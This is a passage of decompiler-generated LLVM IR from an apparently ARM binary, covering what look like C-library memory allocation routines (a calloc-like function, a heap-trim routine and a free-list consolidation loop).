  store i32 %v0_d080, i32* %r0.global-to-local, align 4
  store i32 %v3_c77c, i32* @r4, align 4
  store i32 %v6_c77c, i32* @r5, align 4
  store i32 %v9_c77c, i32* @r6, align 4
  store i32 %v12_c77c, i32* @r7, align 4
  store i32 %v15_c77c, i32* @r8, align 4
  store i32 %v18_c77c, i32* @sb, align 4
  store i32 %v21_c77c, i32* @sl, align 4
  store i32 %v24_c77c, i32* @fp, align 4
  store i32 %v27_c77c, i32* @lr, align 4
  ret i32 %v0_d080

; uselistorder directives
  uselistorder i32 %v0_d024, { 1, 0, 2 }
  uselistorder i32 %v3_d00c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_d008, { 1, 0 }
  uselistorder i32 %v2_cfec, { 2, 0, 1, 3 }
  uselistorder i32 %v4_cfe4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_cf9c, { 1, 2, 0 }
  uselistorder i32 %v0_cf64, { 1, 0 }
  uselistorder i32 %v0_cf58, { 1, 0 }
  uselistorder i32 %v2_cf48, { 1, 0 }
  uselistorder i32 %v2_ced8, { 2, 1, 0 }
  uselistorder i32 %v2_cec0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_ceb8, { 1, 0, 2 }
  uselistorder i32 %v1_ceb4, { 2, 1, 0 }
  uselistorder i32 %v0_ceb4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_ce98, { 1, 0 }
  uselistorder i32 %v2_ce70, { 1, 0 }
  uselistorder i32 %v3_ce64, { 1, 0, 2 }
  uselistorder i32 %v2_ce44, { 1, 0, 2 }
  uselistorder i32* %v2_ce3c, { 1, 0, 2 }
  uselistorder i32 %v0_ce24, { 1, 0 }
  uselistorder i32 %v6_ce00, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_cdec, { 2, 1, 0 }
  uselistorder i32 %v0_cdd4, { 1, 0 }
  uselistorder i32 %v2_cd90, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cd8c, { 1, 0 }
  uselistorder i32 %v3_cd64, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_cd44, { 1, 0, 2 }
  uselistorder i32 %v2_cd2c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_ccd4, { 2, 1, 0 }
  uselistorder i32 %v6_ccc8, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_cca4, { 2, 1, 0, 3 }
  uselistorder i32 %v3_cc64, { 1, 0, 2, 3 }
  uselistorder i32 %v0_cc24, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_cc1c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cc18, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_cc04, { 1, 0 }
  uselistorder i32 %v7_cbc4, { 1, 0 }
  uselistorder i32 %v4_cbc4, { 1, 0 }
  uselistorder i32 %v0_cb94, { 1, 0 }
  uselistorder i32 %v2_cb68, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_cb6454, { 1, 0 }
  uselistorder i32 %v1_cb30, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_cb18., { 1, 2, 0 }
  uselistorder i32 %v0_cb20, { 0, 1, 3, 2 }
  uselistorder i32 %v1_cb20, { 1, 0 }
  uselistorder i32 %v3_cb00, { 1, 0 }
  uselistorder i32 %v4_cafc, { 1, 0, 2 }
  uselistorder i32 %v1_ca6c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_cac4, { 1, 0 }
  uselistorder i32 %v1_caa8, { 1, 0 }
  uselistorder i32 %v1_c948, { 1, 0 }
  uselistorder i32 %v0_ca88, { 2, 0, 1, 3 }
  uselistorder i32 %v3_ca50, { 2, 0, 1, 3 }
  uselistorder i32 %v0_cae4.pre, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 2, 1, 0 }
  uselistorder i32 %v3_ca20, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_c940, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_c9e8, { 1, 0 }
  uselistorder i32 %v3_c9dc, { 1, 0 }
  uselistorder i32 %v0_c9e8, { 1, 0 }
  uselistorder i32 %v3_c9c0, { 0, 2, 3, 1 }
  uselistorder i32 %v2_c9b0, { 1, 0, 2 }
  uselistorder i32 %v3_c968, { 2, 1, 0 }
  uselistorder i32 %v0_c958, { 3, 2, 1, 0 }
  uselistorder i32 %v0_c928, { 1, 0 }
  uselistorder i32 %v1_c8dc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_c8d8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_c87c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_c870, { 1, 0 }
  uselistorder i32 %v3_c840, { 1, 0 }
  uselistorder i32 %v0_c834, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_c814, { 0, 2, 1, 3 }
  uselistorder i1 %v7_c808, { 1, 0 }
  uselistorder i32 %v0_c7d8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 12, 10, 0, 1, 2, 3, 11, 4, 14, 15, 13, 16, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 33, 30, 31, 32, 34, 35, 36, 37, 1, 2, 38, 39, 40, 41, 42, 43, 44, 45, 46, 51, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 71, 102, 66, 67, 68, 69, 70, 72, 73, 97, 98, 0, 99, 100, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32* %r2.global-to-local, { 46, 47, 48, 49, 50, 51, 52, 53, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 58, 36, 37, 38, 54, 55, 56, 57, 59, 60, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %r1.global-to-local, { 38, 39, 40, 41, 42, 43, 44, 45, 46, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 52, 47, 48, 49, 50, 51, 53, 33, 32, 34, 35, 36, 37 }
  uselistorder i32* %r0.global-to-local, { 49, 47, 50, 48, 51, 52, 3, 16, 8, 5, 17, 6, 7, 10, 9, 14, 11, 18, 13, 12, 19, 15, 23, 21, 20, 22, 53, 24, 26, 25, 30, 27, 28, 4, 29, 31, 32, 33, 34, 36, 37, 35, 54, 59, 56, 55, 57, 58, 2, 1, 38, 39, 40, 41, 43, 42, 46, 45, 44, 0 }
  uselistorder i32* %lr.global-to-local, { 9, 10, 11, 12, 13, 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %ip.global-to-local, { 29, 30, 31, 32, 2, 3, 4, 5, 6, 9, 8, 10, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 44, 43, 36, 33, 1, 34, 35, 37, 38, 39, 40, 41, 42, 23, 22, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_effc, { 1, 0 }
  uselistorder i32 34, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @function_c704, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_d064, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_d060, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_d048, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_cfdc, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_cf58, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_cf50, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_ce24, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_cd58, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb6c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cb30, { 1, 0 }
  uselistorder label %dec_label_pc_cae4, { 1, 0 }
  uselistorder label %dec_label_pc_ca78, { 1, 0 }
  uselistorder label %dec_label_pc_ca74, { 1, 0 }
  uselistorder label %dec_label_pc_ca20, { 1, 0 }
  uselistorder label %dec_label_pc_ca0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c9d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c9c0, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_d094(i32 %arg1) local_unnamed_addr {
dec_label_pc_d094:
  %v0_d094 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d094, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_d094
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d094, %bb
  %v4_d0b0 = phi i32 [ %arg1, %dec_label_pc_d094 ], [ 0, %bb ]
  ret i32 %v4_d0b0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_d0b4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d0b4:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_d0b4 = load i32, i32* @r4, align 4
  %v6_d0b4 = load i32, i32* @r5, align 4
  %v9_d0b4 = load i32, i32* @r6, align 4
  %v12_d0b4 = load i32, i32* @lr, align 4
  %v2_d0bc = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_d0cc = mul i32 %arg2, %arg1
  store i32 %v2_d0cc, i32* @r6, align 4
  br i1 %v2_d0bc, label %dec_label_pc_d104, label %dec_label_pc_d0d4

dec_label_pc_d0d4:                                ; preds = %dec_label_pc_d0b4
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_d0cc, i32* @r0, align 4
  %v0_d0dc = call i32 @function_b4a8()
  %v0_d0e0 = load i32, i32* @r4, align 4
  %v9_d0e0 = icmp eq i32 %v0_d0e0, %v0_d0dc
  br i1 %v9_d0e0, label %dec_label_pc_d0d4.dec_label_pc_d104_crit_edge, label %dec_label_pc_d0e8

dec_label_pc_d0d4.dec_label_pc_d104_crit_edge:    ; preds = %dec_label_pc_d0d4
  %v0_d108.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d104

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_d0d4
  %v0_d0ec = call i32 @function_f150()
  %v3_d0f0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_d0f0 = sext i16 %v3_d0f0 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_d0fc = add i32 %v4_d0f0, %v0_d0ec
  %v4_d0fc = inttoptr i32 %v3_d0fc to i32*
  store i32 12, i32* %v4_d0fc, align 4
  br label %dec_label_pc_d1c8

dec_label_pc_d104:                                ; preds = %dec_label_pc_d0d4.dec_label_pc_d104_crit_edge, %dec_label_pc_d0b4
  %v0_d120 = phi i32 [ %v0_d108.pre, %dec_label_pc_d0d4.dec_label_pc_d104_crit_edge ], [ ptrtoint (i32* @global_var_1d280.213 to i32), %dec_label_pc_d0b4 ]
  %v2_d108 = add i32 %v0_d120, 108
  %v3_d108 = inttoptr i32 %v2_d108 to i32*
  %v4_d108 = load i32, i32* %v3_d108, align 4
  store i32 %v4_d108, i32* @r4, align 4
  %v2_d120 = add i32 %v0_d120, 112
  %v3_d120 = inttoptr i32 %v2_d120 to i32*
  %v4_d120 = load i32, i32* %v3_d120, align 4
  store i32 %v4_d120, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d120)
  %v0_d134 = load i32, i32* @r5, align 4
  %v2_d134 = add i32 %v0_d134, 16
  %v3_d134 = inttoptr i32 %v2_d134 to i32*
  %v4_d134 = load i32, i32* %v3_d134, align 4
  store i32 %v4_d134, i32* %ip.global-to-local, align 4
  store i32 53568, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d134)
  %v0_d140 = load i32, i32* @r6, align 4
  %v1_d144 = call i32 @function_c77c(i32 %v0_d140)
  store i32 %v1_d144, i32* %r4.global-to-local, align 4
  %v2_d148 = icmp eq i32 %v1_d144, 0
  br i1 %v2_d148, label %.thread, label %dec_label_pc_d150

dec_label_pc_d150:                                ; preds = %dec_label_pc_d104
  %v1_d150 = add i32 %v1_d144, -4
  %v2_d150 = inttoptr i32 %v1_d150 to i32*
  %v3_d150 = load i32, i32* %v2_d150, align 4
  %v1_d154 = and i32 %v3_d150, 2
  %v2_d154 = icmp eq i32 %v1_d154, 0
  br i1 %v2_d154, label %dec_label_pc_d15c, label %.thread

dec_label_pc_d15c:                                ; preds = %dec_label_pc_d150
  %v1_d15c7 = add i32 %v3_d150, -4
  %v1_d160 = and i32 %v1_d15c7, -4
  %v3_d164 = udiv i32 %v1_d160, 4
  store i32 %v3_d164, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_d160, 36
  %v2_d16c = icmp ult i32 %v1_d160, 33
  %v3_d16c = or i1 %tmp, %v2_d16c
  br i1 %v3_d16c, label %dec_label_pc_d178, label %dec_label_pc_d170

dec_label_pc_d170:                                ; preds = %dec_label_pc_d15c
  %v3_d170 = inttoptr i32 %v1_d144 to i8*
  %v4_d170 = call i32 @function_bff0(i8* %v3_d170, i32 0, i32 %v1_d160)
  br label %.thread

dec_label_pc_d178:                                ; preds = %dec_label_pc_d15c
  %tmp8 = icmp eq i32 %v1_d160, 16
  %v2_d17c = inttoptr i32 %v1_d144 to i32*
  store i32 0, i32* %v2_d17c, align 4
  %v1_d180 = load i32, i32* %r4.global-to-local, align 4
  %v2_d180 = add i32 %v1_d180, 4
  %v3_d180 = inttoptr i32 %v2_d180 to i32*
  store i32 0, i32* %v3_d180, align 4
  %v1_d184 = load i32, i32* %r4.global-to-local, align 4
  %v2_d184 = add i32 %v1_d184, 8
  %v3_d184 = inttoptr i32 %v2_d184 to i32*
  store i32 0, i32* %v3_d184, align 4
  %v2_d188 = icmp ult i32 %v1_d160, 13
  %v3_d188 = or i1 %tmp8, %v2_d188
  br i1 %v3_d188, label %.thread, label %dec_label_pc_d18c

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d178
  %v0_d18c = load i32, i32* %ip.global-to-local, align 4
  %v1_d190 = load i32, i32* %r4.global-to-local, align 4
  %v2_d190 = add i32 %v1_d190, 12
  %v3_d190 = inttoptr i32 %v2_d190 to i32*
  store i32 0, i32* %v3_d190, align 4
  %v1_d194 = load i32, i32* %r4.global-to-local, align 4
  %v2_d194 = add i32 %v1_d194, 16
  %v3_d194 = inttoptr i32 %v2_d194 to i32*
  store i32 0, i32* %v3_d194, align 4
  %tmp9 = icmp ult i32 %v0_d18c, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_d19c

dec_label_pc_d19c:                                ; preds = %dec_label_pc_d18c
  %v0_d19c = load i32, i32* %ip.global-to-local, align 4
  %v7_d19c = icmp eq i32 %v0_d19c, 9
  %v1_d1a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1a0 = add i32 %v1_d1a0, 20
  %v3_d1a0 = inttoptr i32 %v2_d1a0 to i32*
  store i32 0, i32* %v3_d1a0, align 4
  %v1_d1a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1a4 = add i32 %v1_d1a4, 24
  %v3_d1a4 = inttoptr i32 %v2_d1a4 to i32*
  store i32 0, i32* %v3_d1a4, align 4
  br i1 %v7_d19c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_d19c
  %v2_d1a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d1a8 = add i32 %v2_d1a8, 32
  %v4_d1a8 = inttoptr i32 %v3_d1a8 to i32*
  store i32 0, i32* %v4_d1a8, align 4
  %v2_d1ac = load i32, i32* %r4.global-to-local, align 4
  %v3_d1ac = add i32 %v2_d1ac, 28
  %v4_d1ac = inttoptr i32 %v3_d1ac to i32*
  store i32 0, i32* %v4_d1ac, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d19c, %dec_label_pc_d150, %dec_label_pc_d18c, %dec_label_pc_d178, %dec_label_pc_d104, %dec_label_pc_d170, %bb
  store i32 1, i32* @r1, align 4
  %v0_d1bc = load i32, i32* @r5, align 4
  %v2_d1bc = add i32 %v0_d1bc, 44
  %v3_d1bc = inttoptr i32 %v2_d1bc to i32*
  %v4_d1bc = load i32, i32* %v3_d1bc, align 4
  store i32 %v4_d1bc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d1bc)
  br label %dec_label_pc_d1c8

dec_label_pc_d1c8:                                ; preds = %dec_label_pc_d0e8, %.thread
  %v0_d1c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_d0b4, i32* @r4, align 4
  store i32 %v6_d0b4, i32* @r5, align 4
  store i32 %v9_d0b4, i32* @r6, align 4
  store i32 %v12_d0b4, i32* @lr, align 4
  ret i32 %v0_d1c8

; uselistorder directives
  uselistorder i32 %v1_d160, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v1_d144, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1c8, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_d1e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_d1e0:
  %v0_d1e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d1e0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_d1e0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d1e0, %bb
  %v4_d1f0 = phi i32 [ %arg1, %dec_label_pc_d1e0 ], [ 0, %bb ]
  ret i32 %v4_d1f0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_d1f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d1f4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_d1f4 = add i32 %arg2, 44
  %v2_d1f4 = inttoptr i32 %v1_d1f4 to i32*
  %v3_d1f4 = load i32, i32* %v2_d1f4, align 4
  %v12_d1f8 = load i32, i32* @r7, align 4
  %v1_d1fc = add i32 %v3_d1f4, 4
  %v2_d1fc = inttoptr i32 %v1_d1fc to i32*
  %v3_d1fc = load i32, i32* %v2_d1fc, align 4
  %v1_d200 = add i32 %arg2, 860
  %v2_d200 = inttoptr i32 %v1_d200 to i32*
  %v3_d200 = load i32, i32* %v2_d200, align 4
  store i32 %v3_d200, i32* @r4, align 4
  %v1_d204 = and i32 %v3_d1fc, -4
  store i32 %v1_d204, i32* @r6, align 4
  %v1_d208 = add i32 %v1_d204, -17
  %v2_d20c = add i32 %v1_d208, %v3_d200
  store i32 %arg2, i32* @r5, align 4
  %v2_d218 = sub i32 %v2_d20c, %arg1
  store i32 %v2_d218, i32* @r0, align 4
  store i32 %v3_d200, i32* @r1, align 4
  %v0_d220 = call i32 @function_b4a8()
  %v1_d224 = add i32 %v0_d220, -1
  store i32 %v1_d224, i32* %r0.global-to-local, align 4
  %v0_d228 = load i32, i32* @r4, align 4
  %v2_d228 = mul i32 %v0_d228, %v1_d224
  store i32 %v2_d228, i32* @r7, align 4
  %tmp8 = icmp slt i32 %v2_d228, 1
  br i1 %tmp8, label %dec_label_pc_d294, label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d1f4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_d238 = call i32 @function_f4a4(i32 0)
  store i32 %v1_d238, i32* %r0.global-to-local, align 4
  %v0_d23c = load i32, i32* @r5, align 4
  %v1_d23c = add i32 %v0_d23c, 44
  %v2_d23c = inttoptr i32 %v1_d23c to i32*
  %v3_d23c = load i32, i32* %v2_d23c, align 4
  %v0_d240 = load i32, i32* @r6, align 4
  %v2_d240 = add i32 %v0_d240, %v3_d23c
  %v9_d244 = icmp eq i32 %v1_d238, %v2_d240
  store i32 %v1_d238, i32* @r4, align 4
  br i1 %v9_d244, label %dec_label_pc_d250, label %dec_label_pc_d294

dec_label_pc_d250:                                ; preds = %dec_label_pc_d234
  %v0_d250 = load i32, i32* @r7, align 4
  %v1_d250 = sub i32 0, %v0_d250
  store i32 %v1_d250, i32* %r0.global-to-local, align 4
  %v1_d254 = call i32 @function_f4a4(i32 %v1_d250)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_d25c = call i32 @function_f4a4(i32 0)
  store i32 %v1_d25c, i32* %r0.global-to-local, align 4
  %v7_d260 = icmp eq i32 %v1_d25c, -1
  br i1 %v7_d260, label %dec_label_pc_d294, label %dec_label_pc_d268

dec_label_pc_d268:                                ; preds = %dec_label_pc_d250
  %v0_d268 = load i32, i32* @r4, align 4
  %v2_d268 = sub i32 %v0_d268, %v1_d25c
  store i32 %v2_d268, i32* %r0.global-to-local, align 4
  %v9_d268 = icmp eq i32 %v0_d268, %v1_d25c
  br i1 %v9_d268, label %dec_label_pc_d294, label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d268
  %v0_d270 = load i32, i32* @r5, align 4
  %v1_d270 = add i32 %v0_d270, 872
  %v2_d270 = inttoptr i32 %v1_d270 to i32*
  %v3_d270 = load i32, i32* %v2_d270, align 4
  %v1_d274 = load i32, i32* @r6, align 4
  %v2_d274 = sub i32 %v1_d274, %v2_d268
  store i32 %v2_d274, i32* %r2.global-to-local, align 4
  %v1_d278 = add i32 %v0_d270, 44
  %v2_d278 = inttoptr i32 %v1_d278 to i32*
  %v3_d278 = load i32, i32* %v2_d278, align 4
  store i32 %v3_d278, i32* %r1.global-to-local, align 4
  %v2_d27c = sub i32 %v3_d270, %v2_d268
  %v1_d280 = or i32 %v2_d274, 1
  store i32 %v1_d280, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_d27c, i32* %v2_d270, align 4
  %v0_d28c = load i32, i32* %r2.global-to-local, align 4
  %v1_d28c = load i32, i32* %r1.global-to-local, align 4
  %v2_d28c = add i32 %v1_d28c, 4
  %v3_d28c = inttoptr i32 %v2_d28c to i32*
  store i32 %v0_d28c, i32* %v3_d28c, align 4
  %v1_d2a0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d298

dec_label_pc_d294:                                ; preds = %dec_label_pc_d234, %dec_label_pc_d268, %dec_label_pc_d250, %dec_label_pc_d1f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d270, %dec_label_pc_d294
  %v1_d2a0 = phi i32 [ %v1_d2a0.pre, %dec_label_pc_d270 ], [ 0, %dec_label_pc_d294 ]
  store i32 %v12_d1f8, i32* @r7, align 4
  ret i32 %v1_d2a0

; uselistorder directives
  uselistorder i32 %v1_d25c, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_d298, { 1, 0 }
  uselistorder label %dec_label_pc_d294, { 1, 2, 0, 3 }
}

define i32 @function_d2a4() local_unnamed_addr {
dec_label_pc_d2a4:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d2a4 = load i32, i32* @r4, align 4
  store i32 %v3_d2a4, i32* %stack_var_-36, align 4
  %v0_d2a8 = load i32, i32* @r0, align 4
  %v1_d2a8 = inttoptr i32 %v0_d2a8 to i32*
  %v2_d2a8 = load i32, i32* %v1_d2a8, align 4
  store i32 %v2_d2a8, i32* %r3.global-to-local, align 4
  %v2_d2ac = icmp eq i32 %v2_d2a8, 0
  store i32 %v0_d2a8, i32* @r4, align 4
  br i1 %v2_d2ac, label %dec_label_pc_d3e4.preheader, label %dec_label_pc_d2c0

dec_label_pc_d3e4.preheader:                      ; preds = %dec_label_pc_d2a4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_d3ec25 = add i32 %v0_d2a8, 52
  store i32 %v1_d3ec25, i32* %r3.global-to-local, align 4
  %v2_d3f426 = add i32 %v0_d2a8, 60
  %v3_d3f427 = inttoptr i32 %v2_d3f426 to i32*
  store i32 %v1_d3ec25, i32* %v3_d3f427, align 4
  %v0_d3f828 = load i32, i32* %r3.global-to-local, align 4
  %v2_d3f829 = add i32 %v0_d3f828, 12
  %v3_d3f830 = inttoptr i32 %v2_d3f829 to i32*
  store i32 %v0_d3f828, i32* %v3_d3f830, align 4
  br label %dec_label_pc_d3e4.dec_label_pc_d3e4_crit_edge

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d2a4
  %v1_d2c0 = and i32 %v2_d2a8, -3
  %v3_d2c4 = udiv i32 %v2_d2a8, 8
  store i32 %v3_d2c4, i32* %r2.global-to-local, align 4
  store i32 %v1_d2c0, i32* %v1_d2a8, align 4
  %v0_d2cc = load i32, i32* @r0, align 4
  %v1_d2cc = add i32 %v0_d2cc, -4
  store i32 %v1_d2cc, i32* %r3.global-to-local, align 4
  %v1_d2d0 = load i32, i32* %r2.global-to-local, align 4
  %v4_d2d0 = mul i32 %v1_d2d0, 4
  %v5_d2d0 = add i32 %v4_d2d0, %v1_d2cc
  store i32 %v5_d2d0, i32* %sb.global-to-local, align 4
  %v1_d2d4 = add i32 %v0_d2cc, 52
  store i32 %v1_d2d4, i32* %r7.global-to-local, align 4
  %v1_d2d8 = add i32 %v0_d2cc, 4
  store i32 %v1_d2d8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d3dc, %dec_label_pc_d2c0
  %v1_d3d410 = phi i32 [ %v1_d3d4, %dec_label_pc_d3dc ], [ %v5_d2d0, %dec_label_pc_d2c0 ]
  %v1_d2ec = phi i32 [ %v1_d3dc, %dec_label_pc_d3dc ], [ %v1_d2d8, %dec_label_pc_d2c0 ]
  %v1_d2e0 = inttoptr i32 %v1_d2ec to i32*
  %v2_d2e0 = load i32, i32* %v1_d2e0, align 4
  store i32 %v2_d2e0, i32* %r1.global-to-local, align 4
  %v2_d2e4 = icmp eq i32 %v2_d2e0, 0
  br i1 %v2_d2e4, label %dec_label_pc_d3d4, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2e0
  %v0_d2ec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_d2ec, i32* %v1_d2e0, align 4
  %v0_d2f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d2f0

dec_label_pc_d2f0:                                ; preds = %dec_label_pc_d3c8, %dec_label_pc_d2ec
  %v0_d30c = phi i32 [ %v0_d3c8, %dec_label_pc_d3c8 ], [ %v0_d2f0.pre, %dec_label_pc_d2ec ]
  %v1_d2f0 = add i32 %v0_d30c, 4
  %v2_d2f0 = inttoptr i32 %v1_d2f0 to i32*
  %v3_d2f0 = load i32, i32* %v2_d2f0, align 4
  store i32 %v3_d2f0, i32* %r3.global-to-local, align 4
  %v1_d2f4 = and i32 %v3_d2f0, -2
  store i32 %v1_d2f4, i32* %lr.global-to-local, align 4
  %v2_d2f8 = add i32 %v1_d2f4, %v0_d30c
  store i32 %v2_d2f8, i32* @r0, align 4
  %v1_d2fc = urem i32 %v3_d2f0, 2
  %v2_d2fc = icmp eq i32 %v1_d2fc, 0
  %v1_d300 = add i32 %v0_d30c, 8
